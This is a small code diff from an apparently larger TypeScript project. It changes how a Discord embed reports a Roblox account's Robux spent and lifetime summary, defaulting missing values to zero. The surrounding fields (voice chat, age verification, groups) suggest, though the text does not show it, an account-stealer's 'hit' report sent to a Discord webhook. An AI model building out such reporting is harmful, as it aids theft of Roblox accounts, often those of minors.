@@ -512,8 +512,8 @@ function buildDiscordPayload(opts: {
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "💳 Total Robux Spent", value: roblox.robuxSpent !== null ? `${roblox.robuxSpent.toLocaleString()} R$` : "Unknown", inline: true },
-      { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
+      { name: "💳 Total Robux Spent", value: `${(roblox.robuxSpent ?? 0).toLocaleString()} R$`, inline: true },
+      { name: "📊 Lifetime Summary", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
     );
 
     // Tracked games played
